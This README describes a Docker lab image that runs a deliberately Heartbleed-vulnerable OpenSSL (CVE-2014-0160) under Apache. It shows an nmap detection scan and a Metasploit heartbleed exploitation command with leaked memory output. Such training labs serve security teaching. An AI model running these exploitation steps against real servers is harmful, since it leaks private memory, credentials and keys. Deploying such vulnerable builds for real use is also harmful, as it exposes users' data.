# Vulnerability as a Service - CVE 2014-0160
A Debian (Wheezy) Linux system with a vulnerable version of libssl and openssl and a web server to showcase CVS-2014-0160, a.k.a. Heartbleed.

# Overview
This docker container is based on Debian Jessie and has been modified to use a vulernable version of libssl and openssl.

A simple static web page is served via Apache 2.

# Usage
Install the container with `docker pull hmlio/vaas-cve-2014-0160`

Run the container with a port mapping `docker run -d -p 8443:443 hmlio/vaas-cve-2014-0160`

You should be able to access the web application at http://your-ip:8443/.

# Checking
The web server/vulnerable openssl/libssl version can be verified and exploited as shown below (using a Kali machine is recommended):</br>

``` sh
root@kali:~/vaas-cve-2014-0160# nmap -sV -p 8443 --script=ssl-heartbleed your-ip
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-26 17:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000068s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
8443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.10 (Debian)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

# Exploitation
``` sh
Using msfcli from the Metasploit framework:
root@kali:/tmp# msfcli auxiliary/scanner/ssl/openssl_heartbleed RHOSTS=your-ip RPORT=8443 VERBOSE=true E

...
...
[*] 192.168.179.230:8443 - Sending Heartbeat...
[*] 192.168.179.230:8443 - Heartbeat response, 65535 bytes
[+] 192.168.179.230:8443 - Heartbeat response with leak
[*] 192.168.179.230:8443 - Printable info leaked: U`tcz~8}"V2|vf3<tf"!98532ED/A/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: de,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip
```
